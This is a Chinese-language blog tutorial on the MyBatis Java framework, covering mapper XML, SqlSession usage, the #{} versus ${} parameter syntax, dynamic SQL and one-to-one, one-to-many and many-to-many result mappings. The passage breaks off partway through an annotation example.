encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.lusir.dao.UserImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--查询操作--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">        select * from  user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lusir.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lusir.domin.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/27 - 14:25</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lusir.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.lusir.dao.UserImpl;</span><br><span class="line"><span class="keyword">import</span> com.lusir.domin.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.io.Resources;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lusir</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/9/27 - 10:20</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//获得核心配置文件</span></span><br><span class="line">        InputStream is= Resources.getResourceAsStream(<span class="string">&quot;sqlMapperConfig.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//获得Session工厂对象</span></span><br><span class="line">        SqlSessionFactory sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(is);</span><br><span class="line">        <span class="comment">//获得session回话对象</span></span><br><span class="line">        SqlSession sqlSession = sqlSessionFactory.openSession();</span><br><span class="line">        <span class="comment">//执行相关操作</span></span><br><span class="line">        <span class="comment">//List&lt;User&gt; userList = sqlSession.selectList(&quot;userMapper.findAll&quot;);</span></span><br><span class="line">        <span class="comment">//System.out.println(userList);</span></span><br><span class="line">        <span class="comment">//使用这种方法来创建对象</span></span><br><span class="line">        UserImpl mapper = sqlSession.getMapper(UserImpl.class);</span><br><span class="line">        List&lt;User&gt; all = mapper.findAll();</span><br><span class="line">        System.out.println(all);</span><br><span class="line">        sqlSession.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="主要类的介绍"><a href="#主要类的介绍" class="headerlink" title="主要类的介绍"></a>主要类的介绍</h2><blockquote><p>  1） Resources： mybatis中的一个类， 负责读取主配置文件<br>   InputStream in = Resources.getResourceAsStream(“mybatis.xml”);</p><p>  2)SqlSessionFactoryBuilder : 创建SqlSessionFactory对象，<br>     SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();<br>    //创建SqlSessionFactory对象<br>    SqlSessionFactory factory = builder.build(in);</p><p> 3）SqlSessionFactory ： 重量级对象， 程序创建一个对象耗时比较长，使用资源比较多。<br>    在整个项目中，有一个就够用了。</p><p>   SqlSessionFactory:接口 ， 接口实现类： DefaultSqlSessionFactory<br>   SqlSessionFactory作用： 获取SqlSession对象。SqlSession sqlSession = factory.openSession();</p><p>   openSession()方法说明：<br>    1. openSession() ：无参数的， 获取是非自动提交事务的SqlSession对象<br>        2. openSession(boolean): openSession(true) 获取自动提交事务的SqlSession.<br>                 openSession(false) 非自动提交事务的SqlSession对象</p><p> 4)SqlSession:<br>  SqlSession接口 ：定义了操作数据的方法 例如 selectOne() ,selectList() ,insert(),update(), delete(), commit(), rollback()<br>  SqlSession接口的实现类DefaultSqlSession。</p><p>  使用要求： SqlSession对象不是线程安全的，需要在方法内部使用， 在执行sql语句之前，使用openSession()获取SqlSession对象。<br>  在执行完sql语句后，需要关闭它，执行SqlSession.close(). 这样能保证他的使用是线程安全的。</p></blockquote><ol><li>动态代理： 使用SqlSession.getMapper(dao接口.class) 获取这个dao接口的对象</li><li>传入参数： 从java代码中把数据传入到mapper文件的sql语句中。<br>  1）parameterType ： 写在mapper文件中的 一个属性。 表示dao接口中方法的参数的数据类型。<br> 例如StudentDao接口<br> public Student selectStudentById(Integer id) </li></ol><ol start="2"><li>一个简单类型的参数：<br>简单类型： mybatis把java的基本数据类型和String都叫简单类型。<br>在mapper文件获取简单类型的一个参数的值，使用 #{任意字符}</li></ol><p>   接口：public Student selectStudentById(Integer id)<br>   mapper:select id,name, email,age from student where id=#{studentId}</p><ol start="3"><li><p>多个参数，使用@Param命名参数<br> 接口 public List<Student> selectMulitParam(@Param(“myname”) String name, @Param(“myage”) Integer age)<br> 使用 @Param(“参数名”) String name<br> mapper文件：</p></li><li><p>多个参数，使用java对象</p></li></ol><pre><code>语法 #&#123;属性名&#125;</code></pre><p>  vo: value object , 放一些存储数据的类。比如说 提交请求参数， name ,age<br>     现在想把name ,age 传给一个service 类。</p><p>  vo: view object , 从servlet把数据返回给浏览器使用的类，表示显示结果的类。</p><p>  pojo: 普通的有set， get方法的java类。 普通的java对象</p><pre><code> Servlet --- StudentService( addStudent( MyParam param) )</code></pre><p>  entity（domain域）: 实体类， 和数据库中的表对应的类， </p><ol start="5"><li><h1 id="和"><a href="#和" class="headerlink" title="和 $"></a>和 $</h1></li></ol><p>   select id,name, email,age from student where id=#{studentId}</p><p>的结果： select id,name, email,age from student where id=? </p><pre><code>select id,name, email,age from student where id=$&#123;studentId&#125;</code></pre><p>   $ 的结果：select id,name, email,age from student where id=1001</p><p>   String sql=”select id,name, email,age from student where id=” + “1001”;<br>   使用的Statement对象执行sql， 效率比PreparedStatement低。</p><p>   $:可以替换表名或者列名， 你能确定数据是安全的。可以使用$</p><p>和 $区别</p><ol><li><p>#使用 ？在sql语句中做站位的， 使用PreparedStatement执行sql，效率高</p></li><li><p>#能够避免sql注入，更安全。</p></li><li><p>$不使用占位符，是字符串连接方式，使用Statement对象执行sql，效率低</p></li><li><p>$有sql注入的风险，缺乏安全性。</p></li><li><p>$:可以替换表名或者列名</p></li><li><p>mybatis的输出结果<br>mybatis执行了sql语句，得到java对象。</p></li></ol><p>   1）resultType结果类型， 指sql语句执行完毕后， 数据转为的java对象， java类型是任意的。<br>    resultType结果类型的它值 1. 类型的全限定名称  2. 类型的别名， 例如 java.lang.Integer别名是int</p><pre><code>处理方式：  1. mybatis执行sql语句， 然后mybatis调用类的无参数构造方法，创建对象。  2. mybatis把ResultSet指定列值付给同名的属性。  &lt;select id=&quot;selectMultiPosition&quot; resultType=&quot;com.bjpowernode.domain.Student&quot;&gt; select id,name, email,age from student&lt;/select&gt; 对等的jdbc ResultSet rs = executeQuery(&quot; select id,name, email,age from student&quot; ) while(rs.next())&#123;    Student student = new Student();      student.setId(rs.getInt(&quot;id&quot;));      student.setName(rs.getString(&quot;name&quot;)) &#125;</code></pre><ol start="2"><li>定义自定义类型的别名</li></ol><pre><code>1）在mybatis主配置文件中定义，使&lt;typeAlias&gt;定义别名2）可以在resultType中使用自定义别名</code></pre><p>  3）resultMap:结果映射， 指定列名和java对象的属性对应关系。<br>    1）你自定义列值赋值给哪个属性<br>     2）当你的列名和属性名不一样时，一定使用resultMap</p><pre><code> resultMap和resultType不要一起用，二选一</code></pre><h2 id="动态sql"><a href="#动态sql" class="headerlink" title="动态sql"></a>动态sql</h2><blockquote><p> 动态sql: sql的内容是变化的，可以根据条件获取到不同的sql语句。<br>      主要是where部分发生变化。</p><p> 动态sql的实现，使用的是mybatis提供的标签， <if> ,<where>,<foreach></p><p> 1)<if>是判断条件的，<br>  语法<if test="判断java对象的属性值"><br>      部分sql语句<br>    </if></p><p> 2)<where> 用来包含 多个<if>的， 当多个if有一个成立的， <where>会自动增加一个where关键字，<br>      并去掉 if中多余的 and ，or等。</p><p> 3）<foreach> 循环java中的数组，list集合的。 主要用在sql的in语句中。<br>  学生id是 1001,1002,1003的三个学生</p><p>   select * from student where id in (1001,1002,1003)</p><p>   public List<Student> selectFor(List<Integer> idlist)</p><p>   List<Integer> list = new …<br>   list.add(1001);<br>   list.add(1002);<br>   list.add(1003);</p><p>   dao.selectFor(list)</p>   <foreach collection="" item="" open="" close="" separator="">       #{xxx}  </foreach><p>  collection:表示接口中的方法参数的类型， 如果是数组使用array , 如果是list集合使用list<br>   item:自定义的，表示数组和集合成员的变量<br>   open:循环开始是的字符<br>   close:循环结束时的字符<br>  separator:集合成员之间的分隔符</p><p> 4）sql代码片段， 就是复用一些语法<br>  步骤<br>   1.先定义 <sql id="自定义名称唯一"> sql语句， 表名，字段等 </sql><br>  2.再使用， <include refid="id的值" /></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">数据库的属性配置文件： 把数据库连接信息放到一个单独的文件中。 和mybatis主配置文件分开。</span><br><span class="line">目的是便于修改，保存，处理多个数据库的信息。</span><br><span class="line"></span><br><span class="line">   1）在resources目录中定义一个属性配置文件， xxxx.properties ,例如 jdbc.properties</span><br><span class="line">    在属性配置文件中， 定义数据，格式是 key&#x3D;value </span><br><span class="line">     key： 一般使用 . 做多级目录的。</span><br><span class="line">     例如 jdbc.mysql.driver  , jdbc.driver, mydriver</span><br><span class="line">     jdbc.driver&#x3D;com.mysql.jdbc.Driver</span><br><span class="line">     jdbc.url&#x3D;jdbc:mysql&#x2F;&#x2F;.....</span><br><span class="line">     jdbc.username&#x3D;root</span><br><span class="line">     jdbc.password&#x3D;123456</span><br><span class="line">     </span><br><span class="line">   2）在mybatis的主配置文件，使用&lt;property&gt; 指定文件的位置</span><br><span class="line">     在需要使用值的地方， $&#123;key&#125;</span><br><span class="line"></span><br><span class="line"> 2.mapper文件，使用package指定路径</span><br><span class="line">   &lt;mappers&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--第二种方式： 使用包名</span><br><span class="line">      name: xml文件（mapper文件）所在的包名, 这个包中所有xml文件一次都能加载给mybatis</span><br><span class="line">      使用package的要求：</span><br><span class="line">       1. mapper文件名称需要和接口名称一样， 区分大小写的一样</span><br><span class="line">       2. mapper文件和dao接口需要在同一目录</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;package name&#x3D;&quot;com.bjpowernode.dao&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;mappers&gt;</span><br></pre></td></tr></table></figure><h2 id="核心配置文件深入"><a href="#核心配置文件深入" class="headerlink" title="核心配置文件深入"></a>核心配置文件深入</h2><blockquote><p>typeHandlers标签   实现数据库类型字段和java字段之间的转换</p><p>plugins标签</p><p>pageHelper插件</p><ol><li>步骤：</li><li>导入PageHelper</li><li>在Mybatis核心配置文件中配置pageHelper</li><li>测试分页数据获取</li></ol><p>相关用法：</p><ol><li>PageHelper.startPage()</li><li>PageInfo</li></ol></blockquote><h2 id="配置一对一"><a href="#配置一对一" class="headerlink" title="配置一对一"></a>配置一对一</h2><p>重点在于association标签使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.itheima.mapper.OrderMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;orderMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;order&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--手动指定字段与实体属性的映射关系</span></span><br><span class="line"><span class="comment">            column: 数据表的字段名称</span></span><br><span class="line"><span class="comment">            property：实体的属性名称</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;oid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;ordertime&quot;</span> <span class="attr">property</span>=<span class="string">&quot;ordertime&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;total&quot;</span> <span class="attr">property</span>=<span class="string">&quot;total&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;result column=&quot;uid&quot; property=&quot;user.id&quot;&gt;&lt;/result&gt;</span></span><br><span class="line"><span class="comment">        &lt;result column=&quot;username&quot; property=&quot;user.username&quot;&gt;&lt;/result&gt;</span></span><br><span class="line"><span class="comment">        &lt;result column=&quot;password&quot; property=&quot;user.password&quot;&gt;&lt;/result&gt;</span></span><br><span class="line"><span class="comment">        &lt;result column=&quot;birthday&quot; property=&quot;user.birthday&quot;&gt;&lt;/result&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            property: 当前实体(order)中的属性名称(private User user)</span></span><br><span class="line"><span class="comment">            javaType: 当前实体(order)中的属性的类型(User)</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">&quot;user&quot;</span> <span class="attr">javaType</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;uid&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;username&quot;</span> <span class="attr">property</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;password&quot;</span> <span class="attr">property</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;birthday&quot;</span> <span class="attr">property</span>=<span class="string">&quot;birthday&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;orderMap&quot;</span>&gt;</span></span><br><span class="line">         SELECT *,o.id oid FROM orders o,USER u WHERE o.uid=u.id</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="配置一对多"><a href="#配置一对多" class="headerlink" title="配置一对多"></a>配置一对多</h2><p>配置多表   加入resultmap</p><p>重点在与collection标签使用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.itheima.mapper.UserMapper&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;resultMap id=<span class="string">&quot;userMap&quot;</span> type=<span class="string">&quot;user&quot;</span>&gt;</span><br><span class="line">        &lt;id column=&quot;uid&quot; property=&quot;id&quot;&gt;&lt;/id&gt;</span><br><span class="line">        &lt;result column=&quot;username&quot; property=&quot;username&quot;&gt;&lt;/result&gt;</span><br><span class="line">        &lt;result column=&quot;password&quot; property=&quot;password&quot;&gt;&lt;/result&gt;</span><br><span class="line">        &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;&gt;&lt;/result&gt;</span><br><span class="line">        &lt;!--配置集合信息</span><br><span class="line">            property:集合名称</span><br><span class="line">            ofType：当前集合中的数据类型</span><br><span class="line">        --&gt;</span><br><span class="line">        &lt;collection property=<span class="string">&quot;orderList&quot;</span> ofType=<span class="string">&quot;order&quot;</span>&gt;</span><br><span class="line">            &lt;!--封装order的数据--&gt;</span><br><span class="line">            &lt;id column=&quot;oid&quot; property=&quot;id&quot;&gt;&lt;/id&gt;</span><br><span class="line">            &lt;result column=&quot;ordertime&quot; property=&quot;ordertime&quot;&gt;&lt;/result&gt;</span><br><span class="line">            &lt;result column=&quot;total&quot; property=&quot;total&quot;&gt;&lt;/result&gt;</span><br><span class="line">        &lt;/collection&gt;</span><br><span class="line">    &lt;/resultMap&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select id=<span class="string">&quot;findAll&quot;</span> resultMap=<span class="string">&quot;userMap&quot;</span>&gt;</span><br><span class="line">        SELECT *,o.id oid FROM USER u,orders o WHERE u.id=o.uid</span><br><span class="line">    &lt;/select&gt;</span><br></pre></td></tr></table></figure><h2 id="配置多对多"><a href="#配置多对多" class="headerlink" title="配置多对多"></a>配置多对多</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD </span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&lt;mapper&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"></span></span></span><br><span class="line"><span class="meta"><span class="meta-string">    &lt;resultMap id=&quot;</span>userRoleMap<span class="meta-string">&quot; type=&quot;</span>user<span class="meta-string">&quot;&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;!--user的信息--&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;id column=&quot;</span>userId<span class="meta-string">&quot; property=&quot;</span>id<span class="meta-string">&quot;&gt;&lt;/id&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;result column=&quot;</span>username<span class="meta-string">&quot; property=&quot;</span>username<span class="meta-string">&quot;&gt;&lt;/result&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;result column=&quot;</span>password<span class="meta-string">&quot; property=&quot;</span>password<span class="meta-string">&quot;&gt;&lt;/result&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;result column=&quot;</span>birthday<span class="meta-string">&quot; property=&quot;</span>birthday<span class="meta-string">&quot;&gt;&lt;/result&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;!--user内部的roleList信息--&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;collection property=&quot;</span>roleList<span class="meta-string">&quot; ofType=&quot;</span>role<span class="meta-string">&quot;&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">            &lt;id column=&quot;</span>roleId<span class="meta-string">&quot; property=&quot;</span>id<span class="meta-string">&quot;&gt;&lt;/id&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">            &lt;result column=&quot;</span>roleName<span class="meta-string">&quot; property=&quot;</span>roleName<span class="meta-string">&quot;&gt;&lt;/result&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">            &lt;result column=&quot;</span>roleDesc<span class="meta-string">&quot; property=&quot;</span>roleDesc<span class="meta-string">&quot;&gt;&lt;/result&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        &lt;/collection&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">    &lt;/resultMap&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"></span></span></span><br><span class="line"><span class="meta"><span class="meta-string">    &lt;select id=&quot;</span>findUserAndRoleAll<span class="meta-string">&quot; resultMap=&quot;</span>userRoleMap<span class="meta-string">&quot;&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">        SELECT * FROM USER u,sys_user_role ur,sys_role r WHERE u.id=ur.userId AND ur.roleId=r.id</span></span></span><br><span class="line"><span class="meta"><span class="meta-string">    &lt;/select&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta-string"></span></span></span><br><span class="line"><span class="meta"><span class="meta-string"></span></span></span><br><span class="line"><span class="meta"><span class="meta-string"></span></span></span><br><span class="line"><span class="meta"><span class="meta-string">&lt;/mapper&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="注解开发"><a href="#注解开发" class="headerlink" title="注解开发"></a>注解开发</h2><blockquote><ol><li>Result  实现结果集封装</li><li>Results 可以于Result一起使用，封装多个结果集</li><li>One实现一对一结果集</li><li>Many实现一对多结果集</li></ol><p>注解开发还是需要在sqlMapConfig文件中配置mappers</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">package</span>=<span class="string">&quot;要扫描注解的接口全类名&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.Order;</span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.One;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Result;</span><br><span class="line"><span 